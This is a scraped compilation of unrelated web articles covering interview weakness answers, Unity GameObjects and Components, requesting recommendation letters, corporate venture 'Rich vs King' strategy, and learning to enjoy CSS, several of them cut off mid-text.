<p>When answering, the answer should take no more than 90-seconds to recite. If the interviewer asks to learn more about that weakness, be prepared to tell a short story that describes the flaw. The story should use a <a href="https://www.themuse.com/advice/star-interview-method">STAR response</a>. This is a situation, task, action, and result. Or another way to phrase it is that the answer should describe a mistake that embodies the weakness. Only use this method if the interviewer wants to learn more about the weakness.</p>

<p>Always use a previous job or current job as the basis for the answer. Never refer to a sporting team or extracurricular activity unless there is no prior work experience and relevant employment history to refer to. If possible, refer to methods for correcting the weakness at the moment or what might be done the next time the weakness presents itself in a work situation.</p>

<p>Job candidates should follow these answer strategy guidelines and best practices:</p>

<ul>
<li>Avoid using a personality trait or bad habit as a "weakness."</li>
<li>Provide a specific example or concrete example of the "weakness" in use.</li>
<li>Provide insight into how the weakness could be utilized in a "positive light" or used as a personal strength.</li>
<li>It's okay to mention a "weak spot" or "weak area" in professional life. Try to coordinate these areas as also being "core strengths." Meaning, the weakness is a strength, too.</li>
<li>If the weakness is influenced by "external factors" be sure to explain that to the hiring manager without the answer sounding like "blame."</li>
</ul>

<p><strong>Tip:</strong> Job candidates who are confused about how to answer this interview question should consider performing an "informational interview." An <a href="https://career.berkeley.edu/Info/InfoInterview">informational interview</a> is defined as an "informal conversation you can have with someone working in an area of interest to you. It is an effective research tool and is best done after preliminary online research.  It is not a job interview, and the objective is not to find job openings." Informational interviews can provide insight into company culture and requirements of jobs not listed on a job description. And can be useful in obtaining career advice from employed personnel.</p>

<h2>List of Weaknesses and Sample Answers</h2>

<p>Use these weaknesses and sample answers for a job interview. Be sure to answer with a genuine weakness that aligns with what the resume and cover letter may indicate. This job interview question is considered a “tough question” by the employer but one that displays personality and individuality to a potential employer. Spend time considering which weakness is most fitting and consider an appropriate response that's personal.</p>

<h3>1. I can be too detail-oriented.</h3>

<p>Sample answer: “I can find myself getting too heavily involved in the details of a project. While this is an indicator of my passion for the project, I can spend too much time focusing on the minor details and forget about the holistic needs of the team.”</p>

<h3>2. I can care a little too much about our customers.</h3>

<p>Sample answer: “At my previous job, I found myself using too much empathy. In certain circumstances, like in a nursing home, you have to distribute empathy equally. I found it difficult not to emotionally connect with a few patients.”</p>

<h3>3. I have a hard time saying “no.” </h3>

<p>Sample answer: “Saying no is really difficult for me. I like to make sure that our customers and team members are happy. Though, I recognize that if I say ‘Yes’ all the time, I might not be able to follow through with my promise. And this lets my team or customers down even more.”</p>

<h3>4. I have a hard time letting go of a project.</h3>

<p>Sample answer: “When I’ve spent a healthy amount of time and effort on a project, I have a hard time letting others get involved. At my previous job, there was a project I spent 12-months on. And when another team member came to take it over, I found it difficult not to periodically check in on the project and potentially micromanage.”</p>

<h3>5. I sometimes lack confidence.</h3>

<p>Sample answer: “When others ask my opinion, I struggle to present my thoughts and opinions even though I feel they are on target with what the company needs or the project needs. This is simply me not being able to ‘speak up’ for myself.”</p>

<h3>6. It can be difficult to maintain a healthy work/life balance.</h3>

<p>Sample answer: “When I get really passionate about a project, I can spend a little too much time on it and find myself getting a little burnt out. I need to remember that spending time away from a project is healthy.”</p>

<h3>7. I can find adaptability to be too comfortable.</h3>

<p>Sample answer: “I get concerned about the fact that I’m too comfortable with adaptability. Changing environments and the changing of hands. I’d like to think that stability is a good thing at times and is something I should be comfortable with as well.”</p>

<h3>8. I often find myself working too many hours and getting burnt out.</h3>

<p>Sample answer: “Some days I simply can’t put my work down. And I forget that I’m going to have to come back to work the next day. I might work late into the night and get incredibly passionate about a problem. I have to remember to pace myself and think clearly.”</p>

<h3>9. I have a hard time shifting from one project to another.</h3>

<p>Sample answer: “If I’m particularly passionate about one project, I can find it hard to shift into another …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We already discussed
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#gameobject">Game Objects</a> and
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#component">Components</a> as two
of the fundamental building blocks of the Unity Engine. Today, we’ll discuss
their programmatic representation.</p><p><em>This is <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>,
a series for folks familiar with software development best practices seeking an
accelerated introduction to Unity as an engine and editor. More is coming over
the next few weeks, so <a href="http://eepurl.com/gVgusL">consider subscribing</a> for
updates.</em></p><p>The Unity Engine <em>runtime</em> is primarily written in C++, and much of the Engine’s
primitives (such as the game objects and their components) live in C++ land.
You’ll also know that the Unity Engine <em>API</em> is in C#. The API gives you access
to all of Unity’s native objects in a way that<!-- -->—<!-- -->save for a few pitfalls
we’ll discuss today<!-- -->—<!-- -->feels like intuitive, idiomatic C#.</p><figure><p><img src="https://blog.eyas.sh/e1e4978ec3c78301c0c6b929c61f8bf7/object-hierarchy.svg" alt="A GameObject, MonoBehaviour, and ScriptableObject all inherit from UnityEngine Object."></p><figcaption><p>The <em>C#</em> class hierarchy of <code>UnityEngine.Object</code>, <code>GameObject</code>,
<code>ScriptableObject</code>, <code>Component</code>, and their children. This should map to the
<em>conceptual</em> hierarchy of how to think about these objects, though sometimes the
runtime implementation will look different.</p></figcaption></figure><h2 id="unityobject">UnityEngine.Object</h2><p>At the top of the Unity Object hierarchy sits <strong><code>UnityEngine.Object</code></strong>. For the
most part provides a <code>name</code> string, an <code>int GetInstanceID()</code> method, and a bunch
of equality comparers.</p><p>The class also provides a <code>static void Destroy(Object obj)</code> method (and some
overloads) that destroys a <code>UnityEngine.Object</code> and any of its subclasses. When
an Object is destroyed, the <em>native</em> part of the object is freed from memory,
and the smaller <em>managed</em> part will be garbage collected <em>at some point</em> after
there are no more references to it.</p><p>Because your valid reference to a <code>UnityEngine.Object</code> can point to a destroyed
native object, <code>UnityEngine.Object</code> overrides C#‘s <code>operator==</code> and <code>operator!=</code>
to make a destroyed Object <em>appear</em> null. Simply accessing methods on a
destroyed object will return <code>NullReferenceException</code>, albeit with a friendlier
error message that tells you which object you were trying to access.</p><h2 id="gameobject">GameObject</h2><p>A <strong>GameObject</strong> derives from Object and represents anything in your scene.</p><p>Let’s start at a high-level: A GameObject inherits a name and instance ID from
its parent. Otherwise, conceptually, a GameObject</p><ul><li>has a list of <a href="#component"><strong>Components</strong></a> on it,</li><li>has a <code>tag</code> string for organizational purposes, and</li><li>belongs to a <a href="https://docs.unity3d.com/Manual/Layers.html">layer</a>.</li></ul><p>A GameObject’s state</p><ul><li>is the product of all of its <em>Components’</em> state, and</li><li>whether an object is active or not.</li></ul><p>Let’s dig a bit deeper. When starting, most of the interesting stuff in a
GameObject is in its <strong>Components</strong>. A GameObject has at least one Component:
its <a href="https://docs.unity3d.com/ScriptReference/Transform.html"><code>Transform</code></a>. A
Transform describes the position and rotation of the GameObject. A Transform
includes helper properties that show an object’s <em>absolute world</em> position and
rotation, as well as the position and rotation <em>relative</em> to its parent. In the
Editor, the Transform position and rotation are set from the <em>parent relative</em>
variants.</p><p>Since every GameObject has a Transform (and also, given that a Transform is
frequently needed/accessed), the GameObject directly exposes a
<code>Transform transform</code> public property.</p><p>You can access individual components from <code>T GetComponent&lt;T&gt;()</code>, or lists of
components from <code>T[] GetComponents&lt;T&gt;()</code>, etc. These methods search through all
components on a GameObject and return ones with a compatible type (or null, if
none exist in the singular case). Since these methods search through components
and check type compatibility, it is often recommended to cache this lookup.</p><p>If you are building/extending a GameObject by hand, you can always use
<code>T AddComponent&lt;T&gt;()</code>. In most cases, however, you’re better off using the
Editor.</p><p>Individual Objects (a Component or ScriptableObject) might refer to other
<code>GameObjects</code> in a few ways:</p><ul><li><p><strong>By reference</strong>. By exposing a <code>GameObject</code> <em>serialized field</em> that you
then set from the inspector.</p><p><em>We have discussed serialization extensively throughout the series:
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#serialization">as a fundamental concept</a>
and in our tour of the Editor, when
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt4-editor-tour#inspector">describing the Inspector</a>,
and the <a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt2-six-practices">practice</a> of using
the Inspector as an injection framework</em>.</p></li><li><p><strong>Using tags</strong>. Every Game Object can have a <em>tag</em> string. You can find
objects in the scene using that tag through the static functions
<code>GameObject.FindGameObjectsWithTag</code> and <code>GameObject.FindGameObjectWithTag</code>.
A GameObject also exposes a public <code>bool CompareTag(string tag)</code> method.</p><p>This is a quick-and-dirty way to get the job done, but is still a popular
way. A common use of this in the wild is to have a <code>"Player"</code> tag to find
the Player. Ideally, these methods should not be called every frame, so if
you have to use them, consider caching the result.</p></li><li><p><strong>Using layers</strong>. A layer is an <code>int</code> between 0 and 31. Every Game Object is
in exactly one layer.</p><p>While you can’t directly look up all objects in a layer, if you already have
a reference to a GameObject (e.g., in a collision event), you can check a
GameObject against a
<a href="https://docs.unity3d.com/ScriptReference/LayerMask.html"><code>LayerMask</code></a>. A
<code>LayerMask</code> is typically used in functions like <code>Physics.Raycast()</code>. This
allows you to find objects with colliders intersecting with a given <em>ray</em>.
Passing a <code>LayerMask</code> to <code>Physics.Raycast()</code> will only return objects within
the specified set of layers.</p><p>Inside the Unity Engine, <em>Cameras</em> make heavy use of layers. E.g., you can
have one camera that renders “everything but UI”, and overlay another camera
for an in-game HUD, etc.</p></li><li><p><strong>Using indirect references</strong>. There are many reasons why the methods above
might be insufficient: you might not want to use tags to avoid depending on
copy-pasted strings, and layers might not fit your use case. If referencing
a fellow object in-scene is not an option (e.g., you’re dealing with a
dynamic set of objects or don’t have access to the current scene objects in
the context you need this reference, etc.), then you might want to look
further.</p><p>For this, an increasingly popular concept is <em>runtime sets</em> Scriptable
Objects. You can read more about this in Unity’s how-to article on
<a href="https://unity.com/how-to/architect-game-code-scriptable-objects">architecting your game with ScriptableObjects</a>,
based on <a href="https://www.youtube.com/watch?v=raQ3iHhE_Kk">the talk</a> by Ryan
Hipple. If you have an hour to spare, you might want to watch the whole
thing.</p></li></ul><p>A GameObject also exposes a <code>BroadcastMessage</code> and <code>SendMessage</code> functions that
propagate <em>messages</em> (described in the <a href="#component"><strong>Component</strong></a> section) to
all components in or under it.</p><figure><p><span>

User-implemented Components will usually extend the <code>MonoBehaviour</code> subclass
(more on that later).</p><p>A Component inherits a name and instance ID from its parent. Otherwise,
conceptually, a Component</p><ul><li>always <em>belongs</em> to a single GameObject, exposed as a public
<code>GameObject gameObject</code> property, and</li><li>can receive <strong>messages</strong>, driving much of its behavior.</li></ul><p>The state of a component on an <em>active</em> GameObject lies entirely in its
implementation.</p><p>In addition to its <code>GameObject</code>, a component exposes shorthand properties and
methods such as <code>Transform transform</code>, <code>T GetComponent&lt;T&gt;()</code>, etc. These are
simply convenience shorthands for accessing those same methods on the
corresponding <code>gameObject</code>.</p><p>The most important functionality of a Component is driven through <strong>Unity
Messages</strong> (also sometimes called <em>Unity Event Functions</em> when referring to
built-in messages). These are effectively callbacks functions triggered <em>by the
Engine</em> in certain situations. Every Component will receive a <code>Awake()</code>,
<code>Start()</code>, <code>Update()</code> and other messages, for example. The Unity Docs on the
<a href="https://docs.unity3d.com/Manual/ExecutionOrder.html">Order of Execution</a> of
these messages is a convenient resource.</p><p>To have your component receive a particular message, simply add a
<em><code>private void</code></em> method with the appropriate message name. The runtime will use
reflection to call these messages, when applicable. This is why you don’t see an
<code>override</code> directive on these messages. Messages like <code>Update</code>, <code>LateUpdate</code>,
and <code>FixedUpdate</code> are inspected once per type, so don’t worry about reflection
being used in every frame. See more details in the
”<a href="https://blogs.unity3d.com/2015/12/23/1k-update-calls/">10000 Update() calls</a>”
Unity blog post for more information.</p><p>A <strong><code>Behaviour</code></strong> is a type of component that <em>can be enabled or disabled</em>. When
a <code>Behaviour</code> is disabled, <code>Start</code>, <code>Update</code>, <code>FixedUpdate</code>, <code>LateUpdate</code>,
<code>OnEnable</code>, and <code>OnDisable</code> messages are not called.</p><p>A <strong><code>MonoBehaviour</code></strong> is a <code>Behaviour</code> that also enables using
<a href="https://docs.unity3d.com/Manual/Coroutines.html">Coroutines</a>.</p><h2>A Note on Inactive Objects and Disabled Components</h2><p>A GameObject in a loaded scene will exist in memory until the object is
<em>Destroyed</em> explicitly or the scene is unloaded. A GameObject can be set to
<em>inactive</em>, which will cause it to stop receiving <code>Update</code> (and related) events.</p><p><strong>When an object is <em>created</em></strong>, the messages called on a component depend on
if: (1) the GameObject is active, and (2) the component is enabled:</p><table><thead><tr><th></th><th>GameObject is <em>active</em></th><th>GameObject is <em>inactive</em></th></tr></thead><tbody><tr><td>Component is Enabled</td><td><code>Awake</code>, <code>OnEnable</code>, <code>Start</code></td><td><em>Component implicitly disabled</em></td></tr><tr><td>Component is Disabled</td><td><code>Awake</code></td><td><code>Awake</code></td></tr></tbody></table><p><strong>When an object is <em>set to active</em> or a <code>Behaviour</code> is <em>set to enabled</em></strong>:</p><ul><li><code>OnEnable</code> will be called.</li><li>If <code>Start</code> has never been called on this <code>Behaviour</code>, it will be called
exactly once.</li></ul><h2 id="takeaways">Takeaways</h2><p>Some takeaways of all this:</p><ol><li>A Unity object might <em>appear to become <code>null</code></em> when destroyed. <code>== null</code>
checking does more than you think.</li><li>As a result, null-coalescing operators (<code>??</code>, <code>??=</code>) and null-conditional
operators (<code>?.</code>, <code>?[]</code>) don’t work as expected.</li><li>Yes, your Unity Messages can be private!</li><li>Don’t create abstract classes that unnecessarily declare <code>Update</code> or other
messages to make overriding easier; that’ll result in the engine always
calling these events.</li><li>Disabling an Object or Component is a great way to limit its game logic or
save on CPU-bound effort, but these objects still have a memory overhead.</li></ol></div></div>]]>

	    	<p>As a resigning employee, asking for a letter of recommendation (or sometimes referred to as a reference letter) from a current employer, colleague, supervisor, manager, or boss can be a great way to collect a helpful job application asset for the future. When leaving on good terms with a company, this provides the employer with a desire to write a strong letter and overall positive recommendation for future employment purposes.</p>

<p>Asking for a recommendation letter is a fairly simple process. It involves showing gratitude to the letter writer for their future efforts, providing the writer with goals or objectives for the letter, and setting a deadline for when the letter is required (helpful for medical school and college application purposes).</p>

<p>In most cases, recommendation letters are requested for professional purposes, which alleviates the need to punctuate a deadline. When applying for an MBA program or other graduate school (sometimes referred to as “grad school”) needs, for example, providing the writer with the application deadline and application materials (like the application itself) can be useful.</p>

<p><strong>Tip:</strong> To receive a “glowing letter of recommendation”, provide the letter writer with a few guidelines. Always address the reader by name in the greeting, use the CAR format (Challenge/Action/Results) and reference facts of the applicant versus subjective claims.</p>

<p>When asking the recommendation writer to provide insights into the letter. Here are some examples:</p>

<ul>
<li>Including test scores and school projects that admissions officers might appreciate.</li>
<li>Including an extracurricular activity that showed leadership, promise, or drive.</li>
<li>Previous employment experiences that show competencies, skills, and teamwork.</li>
</ul>

<p>Depending on the type of recommendation request, these would be helpful guidelines to send to the recommendation writer for what the letter should contain.</p>

<p><strong>Tip:</strong> Collecting multiple letters from professional references can be helpful for any job seeker.</p>

<p>Here are professionals who may be able to write a recommendation letter:</p>

<ul>
<li>A pastor or minister.</li>
<li>A close family acquaintance.</li>
<li>A previous manager, boss, or supervisor.</li>
<li>A counselor or guidance counselor.</li>
<li>A professor, teacher, or faculty member.</li>
</ul>

<p>All of these individuals would be classified as a good “recommender” to ask for a letter of recommendation.</p>

<p><strong>Tip:</strong> It can be useful to ask a professor for a letter of recommendation during their regularly scheduled office hours.</p>

<p>Recommendation letters can be useful for job seekers, students, and general professionals. They can be used to show a potential employer the worthiness of employment (competencies, skills, personal qualities, and meeting qualifications). Letters of recommendation can be useful for recent graduates who are applying for an internship program. And lastly, for students who are applying for a graduate program, financial aid, a scholarship, or other admissions committee requirements.</p>

<p><strong>Tip:</strong> If seeking a college recommendation letter, it’s best for students to ask for their letters of recommendation during junior year of their schooling. This can “beat the competition” when it comes to the other student body who may be requesting letters of recommendation from their teacher or other faculty. Students should provide their letter writers with their personal statement for college to help assist the writer in creating a great letter of recommendation.</p>

<h2>How to Ask for a Letter of Recommendation</h2>

<p>Below are steps for job seekers and students to consider when asking for a letter of recommendation:</p>

<ul>
<li>Gather a list of professionals, professors, or faculty to request a letter from.</li>
<li>Speak with each one over the phone or in person and request their positive letter of recommendation.</li>
<li>Send them an email outlining objectives for the letter and any job application or college application details (including the deadline). Or a cover letter, resume, and other candidate information.</li>
<li>Upon receiving the recommendation letter, send a thank you email for their time and effort.</li>
</ul>

<h3>Asking a teacher or professor to write a recommendation letter</h3>

<p>Include the following information in the email request to a professor or teacher.</p>

<p><strong>Classwork:</strong> It can be beneficial to write a summary document outlining classwork, grades, and achievements so that the professor can reference when writing the recommendation letter. A professor who teaches hundreds of students is going to need something to look at when they start to write a letter.</p>

<p><strong>A resume:</strong> Including a resume can be helpful for the request of a recommendation letter. It can show the professor what career path the student wants to take and what they are trying to communicate or convey to future employers through prior work experience, skills, and more.</p>

<p><strong>A deadline:</strong> Asking a professor to complete the recommendation letter by a certain date can ensure that the student receives the proper recommendation in a timely manner. This can ensure that the student doesn't miss the opportunity to submit the job application before waiting for the professor to complete the letter. This can be especially helpful if using the recommendation letter for a graduate study program or scholarship request.</p>

<h2>Recommendation Letter Request Email Sample</h2>

<p>Below is a sample letter request email. Job seekers and students should avoid writing a written request for a recommendation as it can take longer to receive the letter.</p>

<h2>Recommendation Letter Request Mistakes</h2>

<p>Below are common mistakes from employees or students requesting a recommendation letter.</p>

<h3>Demanding and not asking</h3>

<p>A good letter takes time to author correctly. The writer needs to consider the applicant or student, consider their objectives, and write something thoughtful. This will take the professor or professional at least one to three hours to complete. One to three hours of a business day is a significant amount of time. If the letter requester demands the letter impolitely, the chances of receiving a well-written letter diminish.</p>

<h3>Not providing useful insights</h3>

<p>Career accomplishments, career goals, test scores, coursework, or other useful pieces of information that the professor or professional can reference while writing the letter is vital. It saves the letter writer a significant amount of time. Include useful metrics and merits for the letter writer.</p>

<h3>Not providing a deadline</h3>

<p>A recommendation letter means nothing if it's not received on time. If applying for graduate school, needing to have board review, or needing the letter for a job application—if the author doesn't comprehend when the requester needs the letter by, it may never be produced.</p>

<h3>Not following up</h3>

<p>If the letter requester didn't receive the letter, the requester should follow-up with the writer. Ask about the progress of the letter and ask if they need any help with authoring the letter.</p>

<h3>Not sharing the job opportunity</h3>

<p>Send the letter writer the business name, the company website, job description, and other useful links. This will help the letter writer craft a more relevant and targeted letter that is authored specifically for the company the job applicant is attempting to be hired at. Going one step further than this would be to inform the letter writer of the hiring managers name and their position so the letter can be authored specifically for that professional.</p>

<h3>Choosing the wrong professional</h3>

<p>It's crucial that the job seeker or employee chooses a professional who thinks highly of them. Asking a professional who doesn't think of them will result in a poorly written letter …</p></div></div>

October 25, 2020 | https://www.highalphainno.com/articles/rich-vs-king-the-corporate-founders-dilemma | <a href="https://web.archive.org/web/*/https://www.highalphainno.com/articles/rich-vs-king-the-corporate-founders-dilemma">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>In his classic book, “<a href="https://www.amazon.com/dp/B007AIXKUM">The Founder’s Dilemmas: Anticipating and Avoiding the Pitfalls That Can Sink a Startup</a>,” former Harvard Business School professor and startup researcher Noam Wasserman introduced the idea that most entrepreneurs have to make a deliberate choice between optimizing for financial returns (“Rich”) or optimizing for control of their company (“King”). His research showed that very few get to be both Rich <em>and</em> King — that’s the rare exception. Most founders typically must decide between “bootstrapping,” which maintains equity ownership but limits growth by having to self-fund growth initiatives via cash flow, or raising outside capital, which accelerates growth but risks diluting founder equity and diminishing the founder’s decision rights on the board of directors.<br></p><p>At High Alpha Innovation, we partner with large corporations to innovate via systematically launching new ventures and building corporate venture studios. We are fortunate to interact frequently with forward-looking executives who are always looking for novel ways to unlock meaningful growth. No matter which type of executive we speak to — a C-suite member, a business unit GM, an innovation leader, a corporate venture capital investor (“CVC”), or even a corporate development deal-junkie — they all seem to face the same Rich versus King tradeoff decision as the entrepreneurial founder when considering launching new ventures. (Note: we do not consider corporate divestitures of more established businesses to be a “new venture” for the purposes of this post).<br></p><p>On one side are executives that might push the organization to invest in a fast-growing VC-backed early stage startup, arguing that using the balance sheet to make a minority equity investment won’t impact the P&amp;L while delivering both high financial returns via eventual sale or IPO of the company as well as meaningful strategic returns through a commercial relationship with the startup that creates differentiation, accelerates time-to-market, or acquires expertise or talent for the corporation. This can be a compelling and valid argument.&nbsp;<br></p><p>On the other side are executives that might push the organization to build new ventures internally that are fully-owned and controlled, arguing this maximizes both financial returns (“we keep 100%, not just a minority”) as well as strategic returns (“we pick the team and dictate the roadmap, so we can customize the new venture to meet our unique strategic needs”). This is also a compelling and valid argument.<br></p><p>Both CVC and internal venture investments have the ability to meet or exceed expectations, but it is <em>always</em> harder than corporations expect and never goes exactly to plan. Many senior corporate executives we speak to, off the record, are frustrated with their CVC investments and internal venturing efforts falling short of lofty financial and strategic goals. “So, which is the better approach: CVC investing or internal venturing?!”&nbsp;<br></p><p>We believe this is the wrong question to ask and a false dichotomy. Successful corporate innovation requires a portfolio approach and having many different tools in the toolkit (e.g. M&amp;A, partnerships, etc.). In certain circumstances CVC investing makes sense and in other circumstances internal innovation may be the better path (a likely topic for a future post). Each tool in the corporate innovation toolkit has its own pros and cons.&nbsp;<br></p><p><strong><em>The right question to ask is why a particular investment did not deliver against expectations. At High Alpha Innovation, we believe many corporations are setting themselves up for failure because they do not consider the tradeoff between being “Rich” or being “King,” and do not explicitly make the hard decision to optimize for one and manage to the other (or somewhere in between - more on that later). They want to have their cake and eat it too, but many times it can end up in their face. This difficult tradeoff decision is what we call the Corporate Founder's Dilemma.</em></strong></p><p>For CVC funds that are structured and operate like standalone VC funds (such as <a href="https://www.gv.com/"><strong>GV</strong></a>, which spun out of Google in 2009), having control or influence over the operations of a portfolio company is usually less of an issue as the CVC has already made the explicit decision to optimize for financial returns. But it’s much more tricky for most corporations whose CVC arms have both a financial and strategic mandate. We believe CVC investments have a higher likelihood of making the corporation “Rich” than internal ventures, as external startups can move faster, tap into the private capital markets to accelerate growth, attract top talent, and avoid the typical innovation barriers within corporations. Strategic returns are harder to deliver, though, as it is hard for many corporations to NOT act like a “King” as they may be used to calling all the shots with vendors and partners. Most CVC investors understand that the corporation is giving up control or influence, but we’ve seen many of the commercial relationship owners between the corporation and startup not understand this, or simply do not accept it. These internal commercial leaders are focused (rightly so) on optimizing for internal business unit success and this can lead them to misinterpret or misuse the CVC investment as a right to force the startup to do whatever it takes to make the internal leader and business unit successful. In our experience, this misalignment of incentives between internal commercial owner, CVC and startup management teams can irreparably damage the relationship when not managed closely and lead to missed financial and strategic targets for both the corporation and the startup.<br></p><p>In regards to internal wholly-owned ventures, if a corporation owns 100% of the new venture, staffs it with salaried and bonused employees without equity ownership, and shares centralized services (e.g. finance, accounting, etc.) with the core business, we see that as just a new business unit no matter what the corporation might want to call it. We hear about many of these “new ventures” (or business units) struggling to gain internal or external traction. We believe this is because most internal ventures are “bootstrapping” without even realizing it. Established public corporations, just like bootstrapped startups, typically self-fund internal growth initiatives through cashflows meaning the growth capital available to new ventures is inherently quite limited. Many innovation leaders we speak with find it incredibly hard to raise sufficient internal capital, especially within public companies that face short-term pressures from Wall Street, for new ventures that typically lose money in the near-term and have uncertain payoffs in the longer-term. Even if a new internal venture can land some internal seed capital and begin to show traction that might warrant additional funding to accelerate growth, allocation of this scarce growth capital is constrained to specific times of year (e.g. annual budgeting) rather than released as appropriate based on performance-based milestones. To boot, these internal ventures also face most, if not all, of the other typical corporate innovation challenges: fighting for scarce resources and internal talent, spending significant time building internal consensus and overcoming bureaucracy, struggling to land exceptional entrepreneurial leaders who dream big and don’t want to work on a salary, and so on. These barriers and the lack of access to sufficient capital and talent often creates “zombie” ventures that are marketed externally as successful innovation (see Innovation Theater), but don’t ever scale to a point where senior corporate leaders acknowledge the venture as a meaningful contributor to corporate growth. In our experience, wholly-owned ventures allow the corporation to act like a “King” and call the shots, but are much less likely to make the corporation “Rich” than CVC investments.&nbsp;<br></p><p><strong>At High Alpha Innovation, we believe the best outcomes come when a corporation explicitly and thoughtfully makes the hard tradeoff between being Rich and being King. Not making a decision, or trying to maximize both, is counterintuitively why many CVC investments and internal ventures fail. Acknowledging this tradeoff and setting the right expectations within the corporation is half the battle.&nbsp;</strong><br></p><p>CVCs must ensure internal commercial owners understand and accept that they will be giving up a significant level of control and train them to treat CVC-backed startups more as strategic partners and less as vendors that they can push around. Innovation leaders who decide they’d prefer to be “King” and fully control a new internal venture must ensure corporate leaders understand and appreciate the capital, talent, and new incentive structures that will be required to scale the new venture over time into a financially meaningful business unit or subsidiary. This might involve convincing the corporation to set aside multi-year funding that the new venture can “unlock” when it hits predetermined milestones regardless of when the milestones are hit. This also might involve getting sign off for new financial incentive structures tied to performance of the new venture that enable key employees to share in the upside (e.g. Stock Appreciation Rights/Phantom Equity, or corporate grants/options tied to specific metrics). Regardless of the tool (CVC or new ventures), we think it’s vitally important for corporations to optimize for one and manage to the other.&nbsp;<br></p><p><strong>However, another good option has emerged recently that lies somewhere in between internal ventures and CVC investments: the majority-owned corporate-founded startup.&nbsp;</strong><br></p><p>We believe this novel approach, when executed well, can deliver financial returns closer to that of CVC investments while also giving corporations a bit more influence over the startup’s strategic direction and product roadmap. This is not about striving to be both Rich and King, it is about sharing some of the returns and some of the control. It’s an effective …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The key reason why you (and likely most developers) struggle with CSS, is that you underestimate it.</p><p>Underestimating CSS leads to a strange feeling of tediousness when writing it, which makes having to deal with it a laborious and seemingly unrewarding task. Style by style, div by div, media query by media query. Having to make endless small tweaks in what feels like an open-ended ‘design’ process with no direction at all can feel like torture to a development-oriented mind.</p><p>Not to mention a complete lack of debugging tools and methods available for when things go wrong.</p><p>This underestimation is a subset of a problem that we developers tend to have with design in general. In short, we don’t think it’s that important. We don’t understand or appreciate its <em>meaning</em>.</p><p>In reality, CSS is as complicated, maybe more so, as any programming language or framework you will ever come across.</p><p>But the general feeling that it is an afterthought within the development process overall, only adds fuel to fire of the thought that leads you to feel that it is tedious.</p><p>The best way to start to get better at it then, is to gain a new appreciation for it, as a 'hard', technical thing. Which it is.</p><p><strong>You do this by reframing how you see it.</strong></p><p>You can start to learn to like CSS by understanding it from a problem solving technical aspect. As an act of 'constructing' a page rather than 'designing' it. By <a target="_blank" title="https://simpleprogrammer.com/information-architecture-developers-learning-design/" href="https://simpleprogrammer.com/information-architecture-developers-learning-design/">engaging the engineering side of your mind</a>.</p><p>Instead of seeing CSS as an annoying way to 'style' pages, see it instead as a visual programming language for constructing visual guides (UI's) for your user.</p><p>You don't 'style' pages, you 'construct' and 'architect' them. It sounds weird to use these words, but they have a massive effect on changing your perception of what you're doing. And that has a massive effect on your impression and willingness to learn how to do it well.</p><p>Essentially, you can properly learn CSS by transforming it in your mind from a 'styling' problem thing, to an 'engineering' problem thing.</p><p>This defeats the feeling of tedium that your mind has when you’re dealing with CSS, and over time, if applied with some of the specific additional tactics that I will explain below, leads to actually _enjoying_ the process of writing CSS.</p><h2>Tactics That Reduce CSS Tediousness &amp; Lead To CSS Enjoyment</h2><p>Once you’ve started to reframe the act of utilizing CSS in your mind, and start to see it as more of a tool for an engineering problem rather than a ‘design’ problem, embers of enjoyment will start to emerge within you as you are writing your CSS. From here, you can start to add some fuel to the growing fire. </p><p>You can do this by utilizing some strategies, tools and techniques that further reduce the tediousness of CSS. </p><p><strong>Let’s go through them.</strong></p><h3>Use tediousness reducing tools, such as <a target="_blank" title="https://tailwindcss.com/" href="https://tailwindcss.com/">TailwindCSS</a>. So you can abstract CSS.</h3><p>I remember back a few years ago when the <a target="_blank" title="https://laravel.com/" href="https://laravel.com/">Laravel Framework</a> came out. PHP Programmers all over the web were fawning over it. The most common phrase I heard was that it gave programmers “their enjoyment of programming” back. This with a language that was notoriously derided as one that was tedious to use.</p><p>What Laravel did was abstract a lot of the annoying parts of most of these developers' workflows when writing PHP code. These developers, at this newfound higher level of abstraction, could now focus on ‘crafting’ their applications, becoming ‘artisans’ of their code rather than simply PHP programmers.</p><p>TailwindCSS does the same thing for CSS. Instead of moving from one file to another to define your styles, Tailwind uses standard default class presets that allow you to write your CSS, essentially directly onto your HTML elements. This <a target="_blank" title="https://news.ycombinator.com/item?id=24034619" href="https://news.ycombinator.com/item?id=24034619">might sound weird</a> at first, but in the end, actually results in a LOT of saved time in development.</p><p>Over time, it, along with other tools, such as Flexbox, also massively increases enjoyment, as you start to intuitively ‘craft’ and construct pages at a higher level of abstraction, rather than simply ‘style’ them.</p><p><strong>Fun fact</strong><strong>:</strong> The creator of TailwindCSS, <a target="_blank" title="https://twitter.com/adamwathan" href="https://twitter.com/adamwathan">Adam Wathan</a> actually started out as a Laravel Developer, so maybe that enthusiasm crossed over to his other project areas.</p><p><strong>EDIT</strong><strong>:</strong> I recently came across a very nice feature in Firefox that helps in debugging overflow issues (one of the most common CSS problems). You can see it in action <a target="_blank" title="https://twitter.com/violasong/status/1314406711696912386" href="https://twitter.com/violasong/status/1314406711696912386">here</a>.</p><h3>Understand how to solve common problems in CSS</h3><p>Because of the lack of debugging tools that are currently available for CSS. Most of debugging within it largely consists of cross-referencing ways that others have dealt with the issue you’re currently facing.</p><p>While this is likely not an uncommon practice in your development workflow (its why StackOverflow exists), it is very time consuming if it is the ONLY way that you can debug. </p><p>One way around this issue is to become familiar with the most common pattern of problems that occur within CSS, and then try to build a repository of solutions to those problems in your mind over time. This sounds simple enough but it very dramatically decreases tedium and increases productivity and speed of development, which ultimately increases your enjoyment.</p><p>For example, one of the most common issues, as referenced in the post drawing, is ‘overflow’ of elements occurring within the page. Sometimes causing the entire page itself to overflow at certain screen sizes. A tutorial like this, outlines the best way to solve this problem.</p><p><strong>Sidenote</strong><strong>:</strong> We are creating a short ebook that deals with this problem, by outlining these most common CSS problems and their solutions, you can sign up for notification of this here: <a target="_blank" 